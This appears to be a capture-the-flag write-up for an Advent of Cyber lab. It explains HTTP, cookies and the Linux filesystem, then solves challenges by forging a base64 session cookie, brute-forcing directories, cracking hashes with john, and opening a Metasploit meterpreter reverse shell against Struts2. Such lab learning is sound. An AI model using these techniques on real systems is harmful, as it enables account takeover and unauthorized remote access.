## Typical HTTP request

```html
GET /login HTTP/1.1 [1]
Host: localhost:3000 [2]
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0 [3]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 [4]
Accept-Language: en-GB,en;q=0.5 [5]
Accept-Encoding: gzip, deflate [6]
Connection: close [7]
Upgrade-Insecure-Requests: 1 [8]
```

- [1] The first part is known as the HTTP verb that tells the server what kind of action the client is requesting. THe most common types are: GET, POST, PUT, DELETE
  The second part refers to the path the action is directed towards - in this case the client is telling the server to get the login page. The third part refers to the protocol - in this case it is version 1.1 of HTTP protocol.
- [2-8] lines 2 to 8 are known as HTTP headers. Header are used by both the client and server to pass extra information to each respective entity. Headers are usually in the form Name: Value

## Typical HTTP response

When the server receives this request, it will respond to the action with an HTTP response. In the case of the following request, this is the response:

```html
HTTP/1.1 200 OK[1]
X-Powered-By: Express[2]
Content-Type: text/html; charset=utf-8[3]
Content-Length: 1493[3]
ETag: W/"5d5-ZdJhoKmkW86HklS/Wy+dOEaa80A"[4]
Date: Fri, 29 Nov 2019 00:20:52 GMT[5]
Connection: close[6]

<!DOCTYPE html>
<html>
```

- [1] The first part of [1] contains the version of the HTTP protocol that the server uses. The second part is known as a status/response code. Response codes are used by the server to indicate the status of a request. They are divided into the following classes:

1XX - Information Requests
2XX - Successful Requests
3XX - Redirects
4XX - Client Errors
5XX - Server Errors

- [2]-[8] are response headers used to pass information to the client. You may notice that [2] is prefaced with “X-” . This is usually the format of a custom header, so anytime you see something like that, it’s worth finding out more. After [6], depending on whether the request is successful, the server will usually pass in content of a page.

Here are some other things to note about the HTTP protocol that will be useful later on:

- HTTP is stateless: the server has no way to keep track of the order of requests the client is sending
- HTTP is unencrypted and is usually used with TLS to form HTTPS, an encrypted form of HTTP which uses certificates to verify that the website really is what is claims to be (i.e. google versus goggles)
- HTTP commonly runs on port 80 while HTTPS commonly runs on port 443 - these can be changed
- There’s a lot more that goes into making a connection from a client to the server and HTTP is only part of that

If HTTP can't keep state, how does the server keep track of what the client is doing, especially if they've logged in and are buying products?

## Cookies

The solution is cookies. Cookies are a key value pair in the form of name:value and can be used for various purposes. For now, we'll focus on the session management. Session Management refers to how the server keeps track of the actions performed by a client. Sessions are usually created with the following workflow:

- User sends username and password to the server to authenticate themselves
- Server checks if users details are correct and sets a cookie
- Every time the user performs an action, the browser sends the cookie as part of the request to the server, which then checks to cookie to ensure the user is authorised to perform a particular action.

Note: An important note to consider is that cookie values will be encoded from time to time. A browser and a server may not be able to interpret particular characters so the value placed in a cookie is encoded when it's sent and decoded under the hood (at either end).

## Day 1

In day 1 we will use a session hijacking methodology to get to login in the portal. After starting the machine we get the login page.

### The steps to solve the problems

First register a user using the the register button then login and bring up the inspect window in the browser. We can see that the cookie under storage tab. Where we have found the name of the cookie that is used to authenticate.

Let's grab the value and as we can see this is a base64 encoded value so let's decode it.

```bash
echo "cookie value" | base64 -d
```

We can see that the cookie has a fixed part in it, and it is using the username as the changed value so we can now forge a cookie with the given username and encode it to base64 then set it to he value field and voila we get the mcinventory users dashboard.

```bash
echo 'mcinventory[------]' | base64 # Replace the [] part with the fixed value that is used in the site.
```

## Day 2

### What is the path of the hidden page?

To get this answer we need to use a directory bruteforcing tools (i.e. feroxbuster, dirbuster, gobuster, or dirsearch). We will use [dirsearch](https://github.com/maurosoria/dirsearch) here.

Let's install dirsearch: clone the git repository then create a virtual env using ```python3 -m venv dir-env``` and activate it. Install all the requirements from requirements.txt given in the repository then build the package and install it.

```bash
$source dir-env/bin/activate
$pip install -r requirements.txt
$python3 setup.py -v build
$python3 setup.py -v install
```

Now we can use dirsearch to search the target for any files and folder.

```bash
$dirsearch -u http://ip:port/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![dirsearch](../resources/aoc1/dirsearch.png)

And we have found answer to our first question.

After visiting the hidden page if we check out the source code of the page we find that there is a comment saying that they have a github repository containing information about the application. So, let's find the github repository and see if we can gather anything useful. And, finally we have got the password of the admin user from the github repository.

After login with the admin user we have the message telling us, what to bring to the partay.

## Day 3

Using wireshark we can easily get the answer to the first and second question in this task.

And we can use john to break the buddy's password

```bash
$john hash.file -w /usr/share/wordlists/rockyou.txt
```

## Day 4

The linux file structure:

Linux uses the filesystem hierarchy standard which defines the way directories/folders are laid out. It's important to understand this structure to understand how the operating system works. The top most directory is called the root directory (/). Since the file system is organised in a hierarchy, every file and folder is located under root directory. Here's the most common layout of the root directory:

- **/bin** - contains programs in the form of binary files that user can run.
- **/boot** - contains the files needed to start the system
- **/dev** - used to represent devices (mostly virtual) that correspond to particular funcitons
- **/etc** - contains configuration files for services on a computer and some system files
- **/usr** - contains executable files (programs) for most system programs
- **/home** - contains home directories for personal users
- **/lib** - contains libraries (which contain extra functions) that are used by executable files in the /bin directories
- **/var** - mostly contain files that store information about how services run (also know as log files)
- **/proc** - contains information about processes running on the system
- **/mnt** - used to mount file systems. Mounts are usually used when users want to access other file systems on their system
- **/opt** - contains optional software
- **/media** - contains temporary files. This folder is usually cleared on reboot so doesn't store any persistent files
- **/root** - contains files created by the super user

### Question 1

How many visible files are there in the home directory (excluding ./ and ../)?

We can just do a simple ls command in the target machine after doing an ssh login and redirect the output to ```wc -l``` and we will get our result.

```bash
$ls | wc -l
```

### Question 2

What is the content of file5?

We can cat the content of file5

```bash
$cat file5
```

### Question 3

Which file contains string password?

We can grep the contents in the files:

```bash
$grep "password" file*
```

## Day 10 : Metasploit

We can see the machine runs Struts2 from the Title of the machine after starting the machine. So now we will focus on getting exploit specifically for struts2 in msfconsole.

We can see that there is an exploit for struts2 by searching ```search struts2``` in metasploit. Then we can use the id number provided in search ```use id``` and we are greeted with the exploit console. Now we should see all the options available to us by typing ```options``` command. Then we have to set the target host and port.

```bash
msf6 > set RHOSTS target_ip
msf6 > set RPORT target_port
msf6 > set LHOST attack_machine_ip
msf6 > set LPORT attack_machine_port
msf6 > set TARGETURI uri_to_compromise
```

At this stage we can see that we have set all the options necessary for our exploit to run. Now we need to set a payload. Let's search for one. ```search payload/linux/x86/meterpreter```, we can see a lot of options available from which we can pick the one that suits our need. I will go for the reverse_tcp ```payload/linux/x86/meterpreter_reverse_tcp``` this one failed so I now I will try for a multi stage payload ```payload/linux/x86/meterpreter/reverse_tcp``` and voila we get a meterpreter reverse shell to the target.

Now we should run ```shell``` command to get a working shell. Search for flag systemwide.

```bash
find / 2>/dev/null | grep -i flag
```

We get a .txt file with name ThisIsFlag1.txt and there we have our first flag. By running ```pwd``` command we can see that we are in /usr/local/tomcat directory. Now let's go to home directory and see how many users home directory are available there. In home directory we can see that only one home is found (i.e. santa). Let's go inside santa and ls there we found the ```ssh-creds.txt``` file, where santa has saved his password in plain text. Let us now ssh the system with the obtained credential. And we can see there are two files present there in santas home directoroy one is ```naughty_list.txt``` and the other one is ```nice_list.txt```. Now we need to read specific lines from the files, that we can do with the sed utility.

```bash
$sed '148!d' naughty_list.txt
$sed '52!d' nice_list.txt
```

## Day 11 : Elf Applications
